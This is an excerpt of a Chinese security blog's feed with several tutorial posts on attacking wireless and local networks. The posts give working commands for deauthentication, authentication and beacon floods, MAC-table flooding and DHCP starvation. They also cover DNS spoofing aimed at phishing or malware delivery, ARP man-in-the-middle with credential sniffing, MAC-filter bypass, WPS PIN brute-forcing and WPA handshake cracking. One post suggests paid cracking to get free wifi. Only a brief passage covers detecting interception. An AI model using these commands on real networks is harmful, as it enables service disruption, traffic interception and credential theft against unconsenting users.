        <content type="html"><![CDATA[<h2 id="airdrop-ng-一款被称之为基于策略的无线Deauth工具"><a href="#airdrop-ng-一款被称之为基于策略的无线Deauth工具" class="headerlink" title="airdrop-ng  一款被称之为基于策略的无线Deauth工具  "></a>airdrop-ng  一款被称之为基于策略的无线Deauth工具  </h2><p>有意思的是，Airdrop-ng并不是个从原理上全新设计的工具，相对于Aireplay-ng 配合-0参数表现出的单一目标指定缺陷，和MDK3等无线D.O.S工具覆盖性较广的不足，Airdrop-ng主要可以通过简单的规则文件编写和自带的 无线厂商OUI列表（即MAC地址列表），间接做到了由工具的使用者来决定无线网络的详细黑白名单，即授权可以连接无线网络的客户端、限定无线客户端与AP的连接对应关系等。<br>对于大多数无线攻击者而言，这款工具很显然地表现出了比MDK3更有效率的无线网络封杀能力，可以更加精准地干扰及锁定目标无线网络。而对于安全人员来说，若能够合理地编写规则，这款工具也能成为一款个不错的WIPS。<br>Airdrop-ng在 BackTrack4 R2下已经内置,在其他BT5,kali并没有  </p>
<h2 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤  "></a>实施步骤  </h2><p>###1.首先抓包<br>airodump-ng -w /root/Desktop/ips –out-format csv wlan0mon  </p>
<p><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/1.jpg" alt="1"><br>抓两分钟的包<br><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/2.jpg" alt="2">  </p>
<p>###2.编写一个规则文件<br>vim RULES<br>格式：d/BSSID|STA<br>a/bssid|STA  </p>
<p><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/3.jpg" alt="3"><br>运行是自上而下的，符合ACL规则<br>第一条为允许98:..STA 连接80..AP<br>第二条为禁止98:..STA 连接任何SSID<br>第三条为禁止0C:..STA 连接2C:AB:25开头的AP<br>第四条为禁止苹果设备连接44：..AP<br>第五条为允许78:0C:B8开头的STA连接80：..AP<br>第六条除了上面以外，其他允许  </p>
<p>###3.调用规则<br>airdrop-ng -i wlan0mon -r RULES -t /root/Desktop/ips-01.csv<br>就行了   </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 干扰通讯 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 干扰通讯 </tag>
            
            <tag> airdrop-ng </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[干扰通讯-Deauth-Flood攻击]]></title>
        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-Deauth-Flood%E6%94%BB%E5%87%BB/</url>
        <content type="html"><![CDATA[<p>mdk3工具内置选项攻击<br>这个攻击跟aireplay-ng -0 一样<br>aireplay-ng -0 10 -a [BSSID] wlan0mon –ignore<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/1.jpg" alt="1"><br>-w 白名单文件<br>-b 黑名单文件<br>-s 速率<br>-c 信道  </p>
<p>先要抓包<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/2.jpg" alt="2">  </p>
<p>mdk3 wlan0mon d<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/3.jpg" alt="3"><br>针对全网的断网攻击<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/4.jpg" alt="4"><br>FF：FF：FF：FF：FF：FF为二层广播帧  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 干扰通讯 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> mdk3 </tag>
            
            <tag> 干扰通讯 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[干扰通讯-Authen泛洪攻击]]></title>
        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-Authen%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</url>
        <content type="html"><![CDATA[<p>authentication洪水攻击<br>mdk3伪装大量的client去连接AP,无法有没密码是否错误，AP都得作出回应，并形成半连接状态。AP是有最大连接数的，会响应不过来。<br>如果合法主机需要连接这个被攻击AP上，是无法连接的。  </p>
<p><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/1.jpg" alt="1"><br>-a 指定mac地址，不指定则为所有<br>-m 使用合法的MAC 从OUI数据库中拿（厂商规定的MAc)<br>-c 不检查测试的成功性<br>-i 测试客户端连接到AP,重注入嗅探数据来保持活性（？）<br>-s 指定速率  </p>
<p>确认AP<br><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/2.jpg" alt="2">  </p>
<p>mdk3 wlan0mon a -a [BSSID]<br><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/3.jpg" alt="3"><br>seems to be INVULNERABLE!(看起来刀枪不入）<br>可能该路由器存在防护机制！  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 干扰通讯 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> mdk3 </tag>
            
            <tag> 干扰通讯 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[干扰通讯-创建恶意无线热点]]></title>
        <url>https://517736522.github.io/2017/02/13/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/</url>
        <content type="html"><![CDATA[<p>beacon泛洪攻击：信标帧标识一个AP,通过伪造多个beacon,创建多个AP  </p>
<p>MDK3工具（很牛逼） wireless DOS tool  </p>
<p><img src="/2017/02/13/干扰通讯-创建恶意无线热点/1.jpg" alt="1">  </p>
<p>–fullhelp 查看更详细的帮助<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/2.jpg" alt="2"><br>这个是今天的主角<br>-n 指定单一SSID名称<br>如果不指定，会随机生成乱码名称<br>-f 指定多个名称的File<br>-v 指定多个MAc和SSID<br>-d 使客户端形成对等网络<br>-w 设置成wep<br>-g 设为54M<br>-t 设置为WPA TKIP加密<br>-a 设置为WPA AES加密<br>-h 信道跳跃<br>-c 加信道<br>-s 速率每秒发多少beacon  </p>
<p>mdk3 mon0 b -n iSafe_Normal -w -g -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/3.jpg" alt="3"><br>只能创建出一个伪WIFI  </p>
<p>mdk3 mon0 b -a -h -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/4.jpg" alt="4"><br>纯恶意的发射beason<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/5.jpg" alt="5">   </p>
<p>###创建常用名WIFI<br>先创建常用名的文本<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/6.jpg" alt="6"><br>mdk3 mon0 b -f /root/Desktop/ssid -a -h -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/7.jpg" alt="7"><br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/8.jpg" alt="8">   </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 干扰通讯 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> mdk3 </tag>
            
            <tag> 干扰通讯 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击]]></title>
        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-mac%E5%9C%B0%E5%9D%80%E8%A1%A8%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E3%80%81DHCP%E5%9C%B0%E5%9D%80%E6%B1%A0%E8%80%97%E5%B0%BD%E6%94%BB%E5%87%BB%E3%80%81%E6%80%9D%E7%A7%91%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</url>
        <content type="html"><![CDATA[<h2 id="mac地址表泛洪攻击"><a href="#mac地址表泛洪攻击" class="headerlink" title="mac地址表泛洪攻击"></a>mac地址表泛洪攻击</h2><p>交换机中的mac地址表是有限的，默认300秒超时时间，但是macof工具3秒钟即可填满，使得交换机无法再学习主机的MAC地址，任何经过交换机的数据包会因为找不到映射而引起单播泛洪即广播整个内网，这个时候就可以抓包查看其它用户的流量。  </p>
<p>macof -i eth0<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/1.jpg" alt="1">  </p>
<p><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/2.jpg" alt="2"><br>效果不好时，可以多开几个macof<br>此时就可以抓包了。  </p>
<h2 id="DHCP地址池耗尽攻击"><a href="#DHCP地址池耗尽攻击" class="headerlink" title="DHCP地址池耗尽攻击"></a>DHCP地址池耗尽攻击</h2><p>因为DHCP服务器地址池有限一般为254个（24位）<br>攻击原理：伪装大量的源地址，去想DHCP服务器请求地址<br>dhcp有租期，在超时前同一地址不会分给不同主机<br>耗尽后，由于很多AP支持地址冲突检测，分发了的IP,是不会连接成功的<br>解决方案：DHCP snooping(家用路由器不具备）  </p>
<p>###使用Yersinia攻击工具<br>DHCP原理：<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/3.jpg" alt="3"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/4.jpg" alt="4"><br>首先得选择网卡-再选择攻击方式<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/5.jpg" alt="5"><br>发送许多请求报文<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/6.jpg" alt="6">  </p>
<p>停止攻击<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/7.jpg" alt="7">  </p>
<h2 id="思科发现协议泛洪攻击"><a href="#思科发现协议泛洪攻击" class="headerlink" title="思科发现协议泛洪攻击"></a>思科发现协议泛洪攻击</h2><p>CDP：思科发现协议（CDP：Cisco Discovery Protocol）CDP 基本上是用来获取相邻设备的协议地址以及发现这些设备的平台。CDP 也可为路由器的使用提供相关接口信息。CDP 是一种独立媒体协议，运行在所有思科本身制造的设备上，包括路由器、网桥、接入服务器和交换机。需要注意的是，CDP是工作在 Layer 2 的协议，默认情况下，每60秒以 01-00-0c-cc-cc-cc 为目的地址发送一次组播通告，当达到180秒的holdtime上限后仍未获得邻居设备的通告时，将清除邻居设备信息。<br>使用Yersinia<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/8.jpg" alt="8"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/9.jpg" alt="9"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/10.jpg" alt="10">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 内网渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> CDP </tag>
            
            <tag> Yersinia </tag>
            
            <tag> macof </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[内网渗透-Ettercap实现DNS欺骗]]></title>
        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Ettercap%E5%AE%9E%E7%8E%B0DNS%E6%AC%BA%E9%AA%97/</url>
        <content type="html"><![CDATA[<p>使用Ettercap的插件dns_spoof即可实现将同一内网的用户用特定的规则将网页解析到自己的欺骗网站上。<br>首先编辑etter.dns文件<br>vim /etc/ettercap/etter.dns<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/1.jpg" alt="1"><br>* A 14.114.124.231<br>把受害者的浏览器全都解析到此IP  </p>
<p>*.qq.com A 10.1.1.14<br>当受害者访问123.qq.com时就解析到此IP<br>10.1.1.14为自己的欺骗用服务器<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/2.jpg" alt="2"><br>ettercap -Tq -i eth0 -P dns_spoof /// ///<br>开始欺骗内网所有主机的dns解析   </p>
<p>受害者打开qq.com<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/3.jpg" alt="3"><br>如果下载的是病毒，就可以得到shell<br>也可以制作钓鱼网站<br>也可以做路由器的钓鱼页面，获取密码  </p>
<p>ettercap记录<br><img src="/2017/02/13/内网渗透-Ettercap实现DNS欺骗/4.jpg" alt="4">  </p>
<p>###关闭DNS劫持时，需要刷新受害者的DNS缓存记录，才能正确解析<br>ipconfig/flushdns  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 内网渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> ettercap </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[内网渗透-ARP欺骗攻击-使用Arpspoof]]></title>
        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB-%E4%BD%BF%E7%94%A8Arpspoof/</url>
        <content type="html"><![CDATA[<p>ARP欺骗攻击：通过发送带有攻击者的mac的免费ARP报文让受害者更新自带的ARP高数缓存表，使得受害者的流量转向到攻击者。<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/1.jpg" alt="1">  </p>
<p>首先开启ip流量转发功能<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward  </p>
<p>然后发送arp免费报文欺骗主机<br>arpspoof -i eth0 -t target1 target2<br>arpspoof -i eth0 -t target2 target1<br>欺骗受害者：我是网关<br>欺骗路由器：我是受害者<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/2.jpg" alt="2"><br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/3.jpg" alt="3"><br>然后欺骗就成功了<br>受害者的流量都流经你那了  </p>
<h2 id="ettercap欺骗攻击工具"><a href="#ettercap欺骗攻击工具" class="headerlink" title="ettercap欺骗攻击工具"></a>ettercap欺骗攻击工具</h2><p>ettercap -G 启用图形化界面<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/4.jpg" alt="4"><br>选择sniff-第一个选项-选择网卡<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/5.jpg" alt="5"><br>扫描主机<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/6.jpg" alt="6"><br>把.101 add to Target 1<br>吧.254 add to Target 2<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/7.jpg" alt="7">  </p>
<p>然后选择mitm-mitm Attack:ARP poisoning–勾选第一个选项<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/8.jpg" alt="8">  </p>
<p>start-start 开始欺骗  </p>
<p>流量也来了  </p>
<p>###命令行模式<br>ettercap -Tq -i eth1 -M arp:remote /33.1.1.101/ /33.1.1.254/<br>就开始欺骗了<br>ettercap -Tq -i eth1 -M arp:remote // //（老版本）<br>ettercap -Tq -i eth1 -M arp:remote /// ///(新版本）<br>进行全网段的欺骗  </p>
<h2 id="driftnet劫持–获取流量中的图片"><a href="#driftnet劫持–获取流量中的图片" class="headerlink" title="driftnet劫持–获取流量中的图片  "></a>driftnet劫持–获取流量中的图片  </h2><p>driftnet -i eth1<br>只要流量有图片经过，会显示  </p>
<p>telnet无加密的流量<br>dsniff -i eth1嗅探流量中POST敏感数据<br><img src="/2017/02/13/内网渗透-ARP欺骗攻击-使用Arpspoof/8.jpg" alt="8">   </p>
<p>###还有很多应用，tcpdump抓包，ferret分析登录数据，hamster登录会话<br>itindex.net/detail/52606-利用-arpspoof-tcpdump</p>
<p>类似cookies的利用， wireshark,omnipeek,tcpdump,Dsploit,sslstrip(破解ssl加密） </p>
<h2 id="如何发现中间人攻击了？"><a href="#如何发现中间人攻击了？" class="headerlink" title="如何发现中间人攻击了？"></a>如何发现中间人攻击了？</h2><p>在windows下tracert 33.1.1.254<br>如果有中间人攻击，第一跳会是攻击者的IP  </p>
<h1 id="实现内网毒化，让其他用户无法上网"><a href="#实现内网毒化，让其他用户无法上网" class="headerlink" title="实现内网毒化，让其他用户无法上网"></a>实现内网毒化，让其他用户无法上网</h1><p>最简单的，不开启ip_forward<br>然后arpspoof -i eth1 -t 33.1.1.254 33.1.1.101<br>欺骗101用户：我是254</p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 内网渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> arpspoof </tag>
            
            <tag> ettercap </tag>
            
            <tag> driftnet </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[内网渗透-网络探测与扫描]]></title>
        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B%E4%B8%8E%E6%89%AB%E6%8F%8F/</url>
        <content type="html"><![CDATA[<p>当看到网段不是192.168.0.0/24或192.168.1.0/24,那么十有八九不是家庭用路由器。  </p>
<h2 id="1-判断网络中存活主机"><a href="#1-判断网络中存活主机" class="headerlink" title="1.判断网络中存活主机"></a>1.判断网络中存活主机</h2><p>nmap -sP 10.1.1.0/24<br><img src="/2017/02/13/内网渗透-网络探测与扫描/3.jpg" alt="3">  </p>
<h2 id="2-判断网络结构"><a href="#2-判断网络结构" class="headerlink" title="2.判断网络结构"></a>2.判断网络结构</h2><p>traceroute qq.com<br><img src="/2017/02/13/内网渗透-网络探测与扫描/1.jpg" alt="1">  </p>
<h2 id="3-判断网络上的设备"><a href="#3-判断网络上的设备" class="headerlink" title="3.判断网络上的设备  "></a>3.判断网络上的设备  </h2><p>nmap -sT IP<br><img src="/2017/02/13/内网渗透-网络探测与扫描/2.jpg" alt="2">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 内网渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> nmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[机制突破-成功获取未广播的SSID]]></title>
        <url>https://517736522.github.io/2017/02/13/%E6%9C%BA%E5%88%B6%E7%AA%81%E7%A0%B4-%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96%E6%9C%AA%E5%B9%BF%E6%92%AD%E7%9A%84SSID/</url>
        <content type="html"><![CDATA[<p>未广播的SSID为隐藏网络，不将SSID带入到beacon帧里。<br>airodump-ng wlan0mon<br><img src="/2017/02/13/机制突破-成功获取未广播的SSID/1.jpg" alt="1">  </p>
<h2 id="1-静静等待"><a href="#1-静静等待" class="headerlink" title="1.静静等待"></a>1.静静等待</h2><p>等待别人连接。<br>SSID会携带到probe request frame里<br>自动在ESSID栏中显示<br><img src="/2017/02/13/机制突破-成功获取未广播的SSID/2.jpg" alt="2">  </p>
<h2 id="2-deauth重连攻击"><a href="#2-deauth重连攻击" class="headerlink" title="2.deauth重连攻击"></a>2.deauth重连攻击</h2><p>主动让别人断开连接，重新连接。<br>aireplay-ng -a [BSSID] -c [客户端MAC] -0 2 wlan0mon<br>失败则指定信道  </p>
<h2 id="3-暴力破解SSID"><a href="#3-暴力破解SSID" class="headerlink" title="3.暴力破解SSID"></a>3.暴力破解SSID</h2><p>bbs.ixsec.org/thread-743-1-1.html  </p>
<h1 id="另外：连接到未开启DHCP的网络"><a href="#另外：连接到未开启DHCP的网络" class="headerlink" title="另外：连接到未开启DHCP的网络  "></a>另外：连接到未开启DHCP的网络  </h1><p>不知道网段的情况下：<br>可监听模式抓包，查看ip层地址即可  </p>
<p>然后本机连接设置静态IP连接即可  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 机制突破 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> deauth </tag>
            
            <tag> 机制突破 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[机制突破-突破Mac-address-filter]]></title>
        <url>https://517736522.github.io/2017/02/13/%E6%9C%BA%E5%88%B6%E7%AA%81%E7%A0%B4-%E7%AA%81%E7%A0%B4Mac-address-filter/</url>
        <content type="html"><![CDATA[<p>mac地址过滤是家庭用路由器都支持的一种无线安全策略，分为黑名单，白名单。  </p>
<p>当我们知道了密码时，我们也是无法通过过滤机制的。<br><img src="/2017/02/13/机制突破-突破Mac-address-filter/1.jpg" alt="1"><br>可以知道客户端的mac是可以通过的<br>那么就可以更改我们的网卡mac绕过过滤。<br>macchanger wlan0 -m xx:xx:xx:xx:xx:xx<br>更改成合法客户端mac即可。  </p>
<p>windows下也有个工具mac changer<br><img src="/2017/02/13/机制突破-突破Mac-address-filter/2.jpg" alt="2"><br><img src="/2017/02/13/机制突破-突破Mac-address-filter/3.jpg" alt="3">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 机制突破 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> macchanger </tag>
            
            <tag> 机制突破 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPS-reaver工具穷举pin码]]></title>
        <url>https://517736522.github.io/2017/02/13/WPS%E7%A0%B4%E8%A7%A3-reaver%E5%B7%A5%E5%85%B7%E7%A9%B7%E4%B8%BEpin%E7%A0%81/</url>
        <content type="html"><![CDATA[<p>reaver工具，具有历史丰碑性，一般破解WPS高级工具都以这个为底层  </p>
<p>只要路由器开启了WPS功能，都是在几小时内能够破解的<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/1.jpg" alt="1">  </p>
<p>如何知道哪些无线Ap开了WPS呢？<br>airodump-ng wlan0mon<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/2.jpg" alt="2"><br>只要MB处54e后带点.的都是开启WPS功能  </p>
<p>wash -i wlan0mon -C<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/3.jpg" alt="3"><br>有WPS功能都会出现  </p>
<p>接下来运行下面的命令进行破解<br>reaver -i wlan0mon -b [BSSID] [-v -a -S -d 0 -t 1 -c 1]<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/5.jpg" alt="5">  </p>
<p>###注意：如果出现了WARNING：Failed to associate with XX:XX:XX:XX:XX:XX (ESSID:XXX) 表示不支持wps  </p>
<h2 id="pin码破解原理："><a href="#pin码破解原理：" class="headerlink" title="pin码破解原理："></a>pin码破解原理：</h2><p>1234 567 8<br>前4位 10^4 先跑前4位，跑准了就会固定，再跑后3位<br>后3位 10^3<br>最后1位为检验位<br>一共11000种可能，最快2s/个pin<br>最快时长为6.11小时  </p>
<h2 id="reaver工具参数："><a href="#reaver工具参数：" class="headerlink" title="reaver工具参数："></a>reaver工具参数：</h2><p>-i 网卡名mon0<br>-b BSSID 即ap的mac<br>-c 信道<br>-e ESSID<br>-S 使用最小Diffie-Hellman keys<br>-a 自动检测目标AP最佳配置<br>-t 穷举的超时时间<br>-d 每穷举一次的闲置时间预设为1秒（信号越好RSSI SNR dBm，delay越小）<br>-n Target AP always sends a NACK [Auto] 可以防止漏码（保证每个穷举）<br>-p 加已知的4位或者8位密码<br>-w 详细信息<br>-o 输出<br>-m 指定本机的mac地址<br>-l wps lock后的等待时间 默认60<br>-x 多少次错误后的延迟 默认0<br>-g 最多pin多少次  </p>
<h2 id="通过PIN来获取预共享秘钥"><a href="#通过PIN来获取预共享秘钥" class="headerlink" title="通过PIN来获取预共享秘钥:"></a>通过PIN来获取预共享秘钥:</h2><p>-p pin码<br>只要知道Pin码，那么即使改了密码也能知道<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/4.jpg" alt="4">  </p>
<h2 id="进度文件-mac-wpc"><a href="#进度文件-mac-wpc" class="headerlink" title="进度文件[mac].wpc:"></a>进度文件[mac].wpc:</h2><p>有两个位置：/usr/local/etc/reaver<br>/etc/reaver<br>新一次跑的Ap都会创建进度文件。<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/6.jpg" alt="6">  </p>
<p>第一行 前四位跑到的位置<br>第二行 后三位跑到的位置<br>第三行 0：全部不确定 1：已确定前四 2： 前四后三确定了  </p>
<p>前四：<br>第4行开始才是穷举字典<br>后三：<br>第10004开始才是后三位的字典<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/7.jpg" alt="7">  </p>
<h2 id="指定位置开始破解："><a href="#指定位置开始破解：" class="headerlink" title="指定位置开始破解："></a>指定位置开始破解：</h2><p>假设需要从9000开始：<br>第9005行才是9000<br>9005-4=9001<br>之后把前三改成：<br>9001<br>0<br>0  </p>
<h1 id="pixiewps快速破解："><a href="#pixiewps快速破解：" class="headerlink" title="pixiewps快速破解："></a>pixiewps快速破解：</h1><p>pixiewps，kali下有工具<br>但是reaver1.5集成了-K </p>
<p>reaver -i wlan0mon -c 1 -b [BSSID] -v -S -K 1<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/8.jpg" alt="8"><br>但是要使用较老的雷凌，博通，瑞日立芯片才能实现快速破解<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/9.jpg" alt="9">  </p>
<h1 id="wifite自动化工具："><a href="#wifite自动化工具：" class="headerlink" title="wifite自动化工具："></a>wifite自动化工具：</h1><p>选择wPS目标，会先pixiwps，再穷举wps，不行就暴力破解握手包<br><img src="/2017/02/13/WPS破解-reaver工具穷举pin码/10.jpg" alt="10">  </p>
<p>作者使用了6个多小时破解处理，而且是1开头的PIN<br>如果PIN是9开头也许需要50多个小时了  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPS破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> reaver </tag>
            
            <tag> WPS </tag>
            
            <tag> pixiewps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-使用airolib-ng创建彩虹表加速]]></title>
        <url>https://517736522.github.io/2017/02/13/WPA%E7%A0%B4%E8%A7%A3-%E4%BD%BF%E7%94%A8airolib-ng%E5%88%9B%E5%BB%BA%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%8A%A0%E9%80%9F/</url>
        <content type="html"><![CDATA[<p>使用airolib-ng可以提升一百倍的速度，13万左右<br>1.airolib-ng [数据库名] –import essid [写了一个或多个ssid的txt]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/1.jpg" alt="1">  </p>
<p>2.airolib-ng [数据库名] –import passwd [字典]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/2.jpg" alt="2">  </p>
<p>3.airolib-ng [数据库名] –batch  </p>
<p><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/3.jpg" alt="3">  </p>
<p>4.airolib-ng [数据库名] –export cowpatty [SSID] [表名]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/4.jpg" alt="4">  </p>
<p>5.跑包<br>cowpatty -s [ssid] -d [表名] -r [抓到的cap]<br><img src="/2017/02/13/WPA破解-使用airolib-ng创建彩虹表加速/5.jpg" alt="5">  </p>
<h2 id="针对跑包的几点建议："><a href="#针对跑包的几点建议：" class="headerlink" title="针对跑包的几点建议："></a>针对跑包的几点建议：</h2><p>1.如果自己很闲，自己慢慢跑EWSA pyrit<br>2.如果你有蹭网的需求，找专业跑包的15每个<br>普通包 15 12-24H 用的都是EWSA psk<br>金刚包 40-80 电费5<br>3.如果有商业化需求，使用云计算（国外有，国内应该没，很贵）  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> WPA破解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> WPA </tag>
            
            <tag> airolib-ng </tag>
            
            <tag> 跑包建议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[WPA破解-pyrit:batch-table加速——attack_db模块加速]]></title>
        <url>https://517736522.github.io/2017/02/13/WPA%E7%A0%B4%E8%A7%A3-pyrit-batch-table%E5%8A%A0%E9%80%9F%E2%80%94%E2%80%94attack-db%E6%A8%A1%E5%9D%97%E5%8A%A0%E9%80%9F/</url>
        <content type="html"><![CDATA[<p><a href="http://xiao106347.blog.163.com/blog/static/215992078201311851838" target="_blank" rel="external">http://xiao106347.blog.163.com/blog/static/215992078201311851838</a><br>无线密码破解5：使用GPU加速工具PYRIT极速破解无线密码  </p>
<p>###pyrit为kali下的工具，支持GPU加速  </p>
